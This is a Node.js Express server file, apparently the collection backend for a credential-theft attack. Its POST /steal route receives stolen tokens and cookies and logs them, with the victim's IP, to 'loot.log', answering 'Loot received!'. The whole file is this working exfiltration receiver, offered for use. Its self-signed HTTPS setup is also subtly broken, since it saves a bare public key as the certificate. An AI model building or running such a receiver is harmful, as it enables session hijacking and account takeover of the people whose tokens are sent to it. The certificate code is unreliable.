// server.js
const express = require('express');
const fs = require('fs');
const https = require('https');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(express.json());

// Logging setup
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = { timestamp: new Date().toISOString(), ...data };
    logStream.write(JSON.stringify(entry) + '\n');
}

// ✅ Ensure this route is EXACTLY /steal
app.post('/steal', (req, res) => {
    console.log('Received POST /steal'); // Debug log
    const { token, cookie } = req.body;
    
    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing data' });
    }

    logSecure({ action: 'steal', token, cookie, ip: req.ip });
    res.status(200).json({ message: 'Loot received!' });
});

// HTTPS Setup (Self-signed for dev)
const certDir = path.join(__dirname, 'certs');
if (!fs.existsSync(certDir)) fs.mkdirSync(certDir);

const keyFile = path.join(certDir, 'key.pem');
const certFile = path.join(certDir, 'cert.pem');

// Generate certs if missing
if (!fs.existsSync(keyFile) || !fs.existsSync(certFile)) {
    const crypto = require('crypto');
    const { generateKeyPairSync } = crypto;
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
    fs.writeFileSync(keyFile, privateKey);
    fs.writeFileSync(certFile, publicKey);
}

const httpsOptions = {
    key: fs.readFileSync(keyFile),
    cert: fs.readFileSync(certFile),
};

const PORT = process.env.PORT || 3000;
const server = https.createServer(httpsOptions, app);

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
